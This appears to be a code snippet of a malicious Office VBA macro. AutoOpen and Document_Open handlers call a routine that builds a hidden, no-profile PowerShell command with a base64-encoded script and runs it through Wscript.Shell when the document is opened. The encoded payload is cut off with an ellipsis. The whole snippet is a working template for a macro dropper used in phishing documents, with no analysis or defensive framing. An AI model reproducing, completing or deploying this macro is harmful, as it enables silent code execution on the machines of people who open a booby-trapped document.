```vb
Sub AutoOpen()
my_macro
End Sub
--------------------------

Sub Document_Open()
my_macro
End Sub
--------------------------
Sub my_macro()
Dim Str As String

Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
...

CreateObject("Wscript.Shell").Run Str
End Sub
--------------------------
```

